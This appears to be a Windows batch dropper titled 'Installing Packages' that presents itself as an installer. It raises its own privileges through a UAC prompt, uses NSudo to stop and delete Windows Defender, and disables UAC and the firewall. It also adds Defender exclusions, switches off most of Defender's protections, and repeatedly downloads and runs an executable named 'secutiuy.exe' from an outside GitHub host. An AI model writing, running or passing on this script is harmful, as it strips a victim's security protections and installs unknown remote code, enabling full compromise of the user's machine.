@echo off>nul
title Installing Packages 
REM
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
REM
if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "cmd.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs"

    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:gotAdmin
bitsadmin/transfer Explorers /download /priority FOREGROUND https://raw.githubusercontent.com/swagkarna/Bypass-Tamper-Protection/main/NSudo.exe %temp%\NSudo.exe
NSudo -U:T -ShowWindowMode:Hide  sc stop  windefend  
NSudo -U:T -ShowWindowMode:Hide  sc delete  windefend  
powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '"%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'"
powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVersion\policies\system -Name EnableLUA -PropertyType DWord -Value 0 -Force
powershell.exe -command "netsh advfirewall set allprofiles state off"
netsh firewall set opmode mode=disable
powershell.exe -command "iwr https://github.com/jpwsnocnwdnuo2jdionwmod/maxj/raw/main/secutiuy.exe -OutFile .\secutiuy.exe"
powershell.exe -command ".\secutiuy.exe"
powershell.exe -command ".\secutiuy.exe"
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell.exe -command "netsh advfirewall set allprofiles state off"
powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
powershell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
powershell.exe -command "Set-MpPreference -PUAProtection disable"
powershell.exe -command "Set-MpPreference -DisableBlockAtFirstSeen $true"
powershell.exe -command "Set-MpPreference -DisableIOAVProtection $true"
powershell.exe -command "Set-MpPreference -DisablePrivacyMode $true"
powershell.exe -command "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true"
powershell.exe -command "Set-MpPreference -DisableArchiveScanning $true"
powershell.exe -command "Set-MpPreference -DisableScriptScanning $true"
powershell.exe -command "Set-MpPreference -DisableIntrusionPreventionSystem $true"
netsh firewall set opmode mode=disable
powershell.exe -command "iwr https://github.com/jpwsnocnwdnuo2jdionwmod/maxj/raw/main/secutiuy.exe -OutFile .\secutiuy.exe"
powershell.exe -command ".\secutiuy.exe"
powershell.exe -command ".\secutiuy.exe"